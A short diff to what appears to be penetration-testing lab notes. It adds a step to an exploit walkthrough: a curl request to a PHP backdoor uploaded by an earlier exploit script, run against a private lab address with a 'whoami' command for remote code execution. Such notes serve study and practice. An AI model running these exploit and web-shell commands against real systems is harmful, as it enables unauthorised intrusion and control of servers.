@@ -19,6 +19,10 @@ python3 50944.py -url http://192.168.50.11/project/ -u george@AIDevCorp.org -p A
 python3 <exploit> -url <ip> -u <username if found> -p <password> (can be used if no user and pass)
 
 ```
+Then use curl to ping the page and get a result from the upload area
+```
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php?cmd=whoami (info after uploads is where the backdoor said it was uploaded to from the previous exploit command, this was for rce)
+```
 
 
 
